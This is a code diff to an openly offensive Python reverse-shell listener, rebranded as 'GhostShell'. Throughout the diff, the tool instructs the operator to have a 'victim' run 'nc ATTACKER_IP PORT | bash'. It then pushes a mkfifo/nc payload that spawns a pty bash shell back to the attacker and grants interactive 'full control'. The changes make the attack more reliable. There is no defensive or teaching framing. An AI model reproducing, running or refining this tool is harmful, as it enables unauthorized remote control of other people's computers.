@@ -11,10 +11,6 @@ import time
 import shutil
 import signal
 
-# ─────────────────────────────────────────
-#  HELPERS
-# ─────────────────────────────────────────
-
 def get_local_ip():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:
@@ -35,14 +31,13 @@ def make_server(port):
     return srv
 
 def banner():
-    print("\033[1;32m")
-    print("  ██████╗ ███████╗██╗   ██╗███████╗██████╗ ███████╗███████╗")
-    print("  ██╔══██╗██╔════╝██║   ██║██╔════╝██╔══██╗██╔════╝██╔════╝")
-    print("  ██████╔╝█████╗  ██║   ██║█████╗  ██████╔╝███████╗█████╗  ")
-    print("  ██╔══██╗██╔══╝  ╚██╗ ██╔╝██╔══╝  ██╔══██╗╚════██║██╔══╝  ")
-    print("  ██║  ██║███████╗ ╚████╔╝ ███████╗██║  ██║███████║███████╗")
-    print("  ╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝")
-    print("                    S H E L L   L I S T E N E R")
+    print("\033[1;36m")
+    print("  ░██████╗░██╗  ██╗░█████╗░░██████╗████████╗░██████╗██╗  ██╗███████╗██╗░░░░░██╗░░░░░")
+    print("  ██╔════╝░██║  ██║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██║  ██║██╔════╝██║░░░░░██║░░░░░")
+    print("  ██║░░██╗░███████║██║░░██║╚█████╗░   ██║   ╚█████╗░███████║█████╗  ██║░░░░░██║░░░░░")
+    print("  ██║░░╚██╗██╔══██║██║░░██║░╚═══██╗   ██║   ░╚═══██╗██╔══██║██╔══╝  ██║░░░░░██║░░░░░")
+    print("  ╚██████╔╝██║  ██║╚█████╔╝██████╔╝   ██║   ██████╔╝██║  ██║███████╗███████╗███████╗")
+    print("  ░╚═════╝░╚═╝  ╚═╝░╚════╝░╚═════╝░   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝")
     print("\033[0m")
 
 # ─────────────────────────────────────────
@@ -52,17 +47,17 @@ def banner():
 banner()
 
 ATTACKER_IP = get_local_ip()
-print(f"  \033[1;34m[*]\033[0m Detected IP : \033[1;33m{ATTACKER_IP}\033[0m")
+print(f"  \033[1;36m[*]\033[0m Detected IP : \033[1;33m{ATTACKER_IP}\033[0m")
 
 try:
-    PORT = int(input("  \033[1;34m[?]\033[0m Listen port : ").strip())
+    PORT = int(input("  \033[1;36m[?]\033[0m Listen port : ").strip())
 except ValueError:
     PORT = 4444
 
 SHELL_PORT = PORT + 1
 
-print(f"  \033[1;34m[*]\033[0m Cmd  port   : {PORT}")
-print(f"  \033[1;34m[*]\033[0m Shell port  : {SHELL_PORT}")
+print(f"  \033[1;36m[*]\033[0m Cmd  port   : {PORT}")
+print(f"  \033[1;36m[*]\033[0m Shell port  : {SHELL_PORT}")
 print()
 
 # ─────────────────────────────────────────
@@ -76,7 +71,7 @@ def await_shell():
     global shell_sock
     srv = make_server(SHELL_PORT)
     srv.settimeout(60)
-    print(f"  \033[1;34m[*]\033[0m Waiting for shell on port {SHELL_PORT}...")
+    print(f"  \033[1;36m[*]\033[0m Waiting for shell on port {SHELL_PORT}...")
     try:
         shell_sock, addr = srv.accept()
         print(f"  \033[1;32m[+]\033[0m Shell connected from {addr[0]}:{addr[1]}")
@@ -94,9 +89,12 @@ time.sleep(0.3)
 #  WAIT FOR VICTIM NC CONNECTION
 # ─────────────────────────────────────────
 
-print(f"  \033[1;34m[*]\033[0m Waiting for victim on port {PORT}...")
-print(f"  \033[1;33m[!]\033[0m Tell victim to run:")
-print(f"\n      nc {ATTACKER_IP} {PORT} | bash\n")
+print(f"  \033[1;36m[*]\033[0m Waiting for victim on port {PORT}...")
+print(f"  \033[1;36m[*]\033[0m Run this on victim:")
+print()
+# ← highlighted in red, bold
+print(f"      \033[1;31m  nc {ATTACKER_IP} {PORT} | bash  \033[0m")
+print()
 
 cmd_srv = make_server(PORT)
 cmd_sock, addr = cmd_srv.accept()
@@ -111,12 +109,10 @@ rows, cols = get_terminal_size()
 
 payload = (
     f"rm -f /tmp/.rs; mkfifo /tmp/.rs; "
-    f"export TERM=xterm; "
-    f"stty rows {rows} cols {cols}; "
-    f"cat /tmp/.rs | bash -i 2>&1 | nc {ATTACKER_IP} {SHELL_PORT} > /tmp/.rs\n"
+    f"cat /tmp/.rs | python3 -c 'import pty; pty.spawn(\"/bin/bash\")' 2>&1 | nc {ATTACKER_IP} {SHELL_PORT} > /tmp/.rs\n"
 )
 
-print(f"  \033[1;34m[*]\033[0m Sending payload...")
+print(f"  \033[1;36m[*]\033[0m Sending payload...")
 try:
     cmd_sock.sendall(payload.encode())
     time.sleep(0.5)
@@ -129,12 +125,12 @@ except Exception as e:
 #  WAIT FOR SHELL CALLBACK
 # ─────────────────────────────────────────
 
-print(f"  \033[1;34m[*]\033[0m Payload sent. Waiting for shell callback (60s)...")
+print(f"  \033[1;36m[*]\033[0m Payload sent. Waiting for shell callback (60s)...")
 shell_ready.wait(timeout=60)
 
 if not shell_sock:
     print("\n  \033[1;31m[!]\033[0m Shell did not connect back.")
-    print("      - Victim needs bash + nc installed")
+    print("      - Victim needs python3 + nc installed")
     print(f"      - Check port {SHELL_PORT} is not firewalled")
     sys.exit(1)
 
@@ -142,23 +138,36 @@ if not shell_sock:
 #  SYNC TERMINAL SIZE
 # ─────────────────────────────────────────
 
-time.sleep(0.3)
+# ─────────────────────────────────────────
+#  SYNC TERMINAL SIZE
+# ─────────────────────────────────────────
 
-# Drain junk
+time.sleep(1.0)
+
+# drain motd/banner junk
 shell_sock.setblocking(False)
-try:
-    while shell_sock.recv(4096):
-        pass
-except:
-    pass
+deadline = time.time() + 0.5
+while time.time() < deadline:
+    try:
+        shell_sock.recv(4096)
+    except:
+        break
+    time.sleep(0.05)
 shell_sock.setblocking(True)
 
-sync = f"stty rows {rows} cols {cols}\nexport TERM=xterm\nclear\n"
-shell_sock.sendall(sync.encode())
+shell_sock.sendall(f"stty rows {rows} cols {cols}\n".encode())
 time.sleep(0.3)
+shell_sock.sendall(f"export TERM=xterm-256color\n".encode())
+time.sleep(0.3)
+shell_sock.sendall(b"clear\n")
+time.sleep(0.5)
+
+# ← REMOVE the second drain block that was here
+# it was eating the shell prompt and waiting for input
 
 print(f"  \033[1;32m[+]\033[0m Shell ready! Rows={rows} Cols={cols}")
-print(f"  \033[1;34m[*]\033[0m You have full control. Ctrl+C to exit.\n")
+print(f"  \033[1;36m[*]\033[0m You have full control.")
+print(f"  \033[1;36m[*]\033[0m Type \033[1;33mexit\033[0m or press \033[1;33mCtrl+C\033[0m to end session.\n")
 print("─" * 60)
 
 # ─────────────────────────────────────────
@@ -181,6 +190,8 @@ signal.signal(signal.SIGWINCH, on_resize)
 fd = sys.stdin.fileno()
 old_settings = termios.tcgetattr(fd)
 
+input_buf = b""
+
 try:
     tty.setraw(fd)
 
@@ -199,18 +210,36 @@ try:
                 char = os.read(fd, 1)
                 if not char:
                     raise Exception("stdin closed")
+
+                input_buf += char
+                if len(input_buf) > 6:
+                    input_buf = input_buf[-6:]
+
+                if b"exit\r" in input_buf or b"exit\n" in input_buf:
+                    raise Exception("Attacker typed exit")
+
                 shell_sock.sendall(char)
 
 except KeyboardInterrupt:
-    pass
-
-except Exception as e:
-    sys.stdout.write(f"\n\033[1;31m[!] Disconnected: {e}\033[0m\n")
-
-finally:
     termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
+    print("\n\033[1;33m[!]\033[0m Ctrl+C caught — closing session.")
     try:
         shell_sock.close()
     except:
         pass
-    print("\n\033[1;32m[*]\033[0m Terminal restored. Session ended.")
+    print("\033[1;36m[*]\033[0m Terminal restored. GhostShell session ended.")
+    sys.exit(0)
+
+except Exception as e:
+    termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
+    msg = str(e)
+    if "Attacker typed exit" in msg:
+        print("\n\033[1;33m[!]\033[0m Exit command detected — closing session.")
+    else:
+        print(f"\n\033[1;31m[!]\033[0m Disconnected: {msg}")
+    try:
+        shell_sock.close()
+    except:
+        pass
+    print("\033[1;36m[*]\033[0m Terminal restored. GhostShell session ended.")
+    sys.exit(0)
